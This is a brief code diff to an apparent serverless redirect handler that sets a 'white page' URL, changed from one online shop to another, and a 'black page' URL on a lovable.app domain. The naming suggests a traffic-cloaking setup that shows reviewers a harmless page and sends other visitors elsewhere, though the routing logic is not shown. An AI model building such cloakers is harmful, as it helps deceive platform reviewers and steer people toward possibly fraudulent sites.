@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://uniworthshop.com/products/black-smart-fit-denim-dm2309-1";
+    const whitePageURL = "https://www.albeebaby.com/";
     const blackPageURL = "https://mintycash.lovable.app";
 
     //testing
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
